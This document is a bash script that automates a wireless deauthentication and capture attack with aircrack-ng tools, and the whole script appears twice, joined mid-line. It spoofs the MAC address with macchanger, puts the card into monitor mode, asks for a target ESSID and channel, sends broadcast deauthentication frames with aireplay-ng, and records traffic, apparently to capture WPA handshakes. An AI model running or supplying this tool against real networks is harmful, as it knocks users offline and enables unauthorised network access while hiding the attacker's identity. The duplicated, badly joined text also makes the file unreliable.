#!/bin/bash

# Colors
end_color="$(tput sgr0)"
red_color="$(tput setaf 1)"
yellow_color="$(tput setaf 3)"
blue_color="$(tput setaf 4)"
green_color="$(tput setaf 2)"
purple_color="$(tput setaf 5)"
turquoise_color="$(tput setaf 6)"

# Network Interface
interface=$(iw dev | awk '$1=="Interface"{print $2}')

# Colors functions
error_m () {
  printf "[%s*%s] %s\n" "${red_color}" "${end_color}" "$1" >&2
  exit 1
}

warning_m () {
  printf "[%s*%s] %s" "${yellow_color}" "${end_color}" "$1"
}

working_m () {
  printf "[%s*%s] %s\n" "${blue_color}" "${end_color}" "$1"
}

ready_m () {
  printf "[%s*%s] %s\n" "${green_color}" "${end_color}" "$1"
}

message_color (){
 printf "[%s*%s] %s%s%s" "${purple_color}" "${end_color}" \
   "${turquoise_color}" "$1" "${end_color}"
}

# Exit Manage
trap ctrl_c INT
ctrl_c () {
  kill -9 "$airodump_ng_xterm_PID" 1>&2 2>/dev/null
  kill -9 "$aireplay_ng_xterm_PID" 1>&2 2>/dev/null
  resetInterface
	exit 0
}

resetInterface () {
  message_color "Resetting Network\n\n"

  working_m "Setting Managed Interface"
  if ! ip link set "$interface" down && iw "$interface" set type managed; then
    error_m "Failed to set managed interface"
  fi

  working_m "Restarting Network Services"
  if ! systemctl restart wpa_supplicant.service \
    NetworkManager.service dhcpcd.service; then
    error_m "Failed to restart network services"
  fi

  working_m "Setting default MAC address"
  if ! macchanger -p "$interface"; then
    error_m "Failed to reset MAC address"
  fi

  if ! ip link set "$interface" up; then
    error_m "Failed to bring interface up"
  fi

  ready_m "Done!"
}

startAttack () {
  # Show networks
   xterm -bg black -hold -geometry '180x60' \
     -e "airodump-ng --wps --manufacturer $interface" &
   airodump_ng_xterm_PID=$!

   # Target
   read -rp "$(message_color 'ESSID: ')" essid
   read -rp "$(message_color 'Channel: ')" channel

   xterm -fg red -bg black \
     -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF \
     -e '$essid' $interface && printf '\n[%s*%s] Done!\n'" &
   aireplay_ng_xterm_PID=$!

   mkdir -p "captures/$essid"
   airodump-ng -w "captures/$essid/$essid-ch$channel" \
     --essid "$essid" -c "$channel" "$interface"
}

setMonitorMode () {
  # Mac Address
  if ! ifconfig "$interface" down && macchanger -a "$interface" >/dev/null; then
    error_m "Failed to set MAC address"
  fi

  if ! ifconfig "$interface" up; then
    error_m "Failed to bring interface up"
  fi

  iw dev | grep monitor >/dev/null
  if [[ "$(echo $?)" -ne 0 ]]; then
    message_color "Setting up environment...\n"
    # Monitor Mode
    if ! airmon-ng check kill >/dev/null; then
      error_m "Failed to kill conflicting processes"
    fi

    if ! airmon-ng start "$interface" >/dev/null; then
      error_m "Failed to start monitor mode"
    fi

    iw dev | grep monitor >/dev/null
    if [[ "$(echo $?)" -ne 0 ]]; then
      error_m "Can't set Monitor Mode"
    fi

  fi

  # Show new configurations
  printf '%s\n' "${yellow_color}"
  iw dev
  macchanger -s "$interface"
  printf '%s\n' "${end_color}"
}

checkDependencies () {
  clear
  dependencies=(aircrack-ng macchanger xterm)

  message_color "Checking dependencies...\n"

  for program in "${dependencies[@]}"; do

    if [ ! -x "$(command -v $program)" ]; then
      error_m "Please install $program"
    fi

    ready_m "$program is installed."
    sleep .5
 done
   
 clear 
}

if [[ $EUID -ne 0 ]]; then
  warning_m "This script must be run as root\n"
  exit 1
fi

clear
checkDependencies
setMonitorMode
startAttack
resetInterface!/bin/bash

# Colors
end_color="$(tput sgr0)"
red_color="$(tput setaf 1)"
yellow_color="$(tput setaf 3)"
blue_color="$(tput setaf 4)"
green_color="$(tput setaf 2)"
purple_color="$(tput setaf 5)"
turquoise_color="$(tput setaf 6)"

# Network Interface
interface=$(iw dev | awk '$1=="Interface"{print $2}')

# Colors functions
error_m () {
  printf "[%s*%s] %s\n" "${red_color}" "${end_color}" "$1" >&2
  exit 1
}

warning_m () {
  printf "[%s*%s] %s" "${yellow_color}" "${end_color}" "$1"
}

working_m () {
  printf "[%s*%s] %s\n" "${blue_color}" "${end_color}" "$1"
}

ready_m () {
  printf "[%s*%s] %s\n" "${green_color}" "${end_color}" "$1"
}

message_color (){
 printf "[%s*%s] %s%s%s" "${purple_color}" "${end_color}" \
   "${turquoise_color}" "$1" "${end_color}"
}

# Exit Manage
trap ctrl_c INT
ctrl_c () {
  kill -9 "$airodump_ng_xterm_PID" 1>&2 2>/dev/null
  kill -9 "$aireplay_ng_xterm_PID" 1>&2 2>/dev/null
  resetInterface
	exit 0
}

resetInterface () {
  message_color "Resetting Network\n\n"

  working_m "Setting Managed Interface"
  if ! ip link set "$interface" down && iw "$interface" set type managed; then
    error_m "Failed to set managed interface"
  fi

  working_m "Restarting Network Services"
  if ! systemctl restart wpa_supplicant.service \
    NetworkManager.service dhcpcd.service; then
    error_m "Failed to restart network services"
  fi

  working_m "Setting default MAC address"
  if ! macchanger -p "$interface"; then
    error_m "Failed to reset MAC address"
  fi

  if ! ip link set "$interface" up; then
    error_m "Failed to bring interface up"
  fi

  ready_m "Done!"
}

startAttack () {
  # Show networks
   xterm -bg black -hold -geometry '180x60' \
     -e "airodump-ng --wps --manufacturer $interface" &
   airodump_ng_xterm_PID=$!

   # Target
   read -rp "$(message_color 'ESSID: ')" essid
   read -rp "$(message_color 'Channel: ')" channel

   xterm -fg red -bg black \
     -e "aireplay-ng -0 10 -c FF:FF:FF:FF:FF:FF \
     -e '$essid' $interface && printf '\n[%s*%s] Done!\n'" &
   aireplay_ng_xterm_PID=$!

   mkdir -p "captures/$essid"
   airodump-ng -w "captures/$essid/$essid-ch$channel" \
     --essid "$essid" -c "$channel" "$interface"
}

setMonitorMode () {
  # Mac Address
  if ! ifconfig "$interface" down && macchanger -a "$interface" >/dev/null; then
    error_m "Failed to set MAC address"
  fi

  if ! ifconfig "$interface" up; then
    error_m "Failed to bring interface up"
  fi

  iw dev | grep monitor >/dev/null
  if [[ "$(echo $?)" -ne 0 ]]; then
    message_color "Setting up environment...\n"
    # Monitor Mode
    if ! airmon-ng check kill >/dev/null; then
      error_m "Failed to kill conflicting processes"
    fi

    if ! airmon-ng start "$interface" >/dev/null; then
      error_m "Failed to start monitor mode"
    fi

    iw dev | grep monitor >/dev/null
    if [[ "$(echo $?)" -ne 0 ]]; then
      error_m "Can't set Monitor Mode"
    fi

  fi

  # Show new configurations
  printf '%s\n' "${yellow_color}"
  iw dev
  macchanger -s "$interface"
  printf '%s\n' "${end_color}"
}

checkDependencies () {
  clear
  dependencies=(aircrack-ng macchanger xterm)

  message_color "Checking dependencies...\n"

  for program in "${dependencies[@]}"; do

    if [ ! -x "$(command -v $program)" ]; then
      error_m "Please install $program"
    fi

    ready_m "$program is installed."
    sleep .5
 done
   
 clear 
}

if [[ $EUID -ne 0 ]]; then
  warning_m "This script must be run as root\n"
  exit 1
fi

clear
checkDependencies
setMonitorMode
startAttack
resetInterface
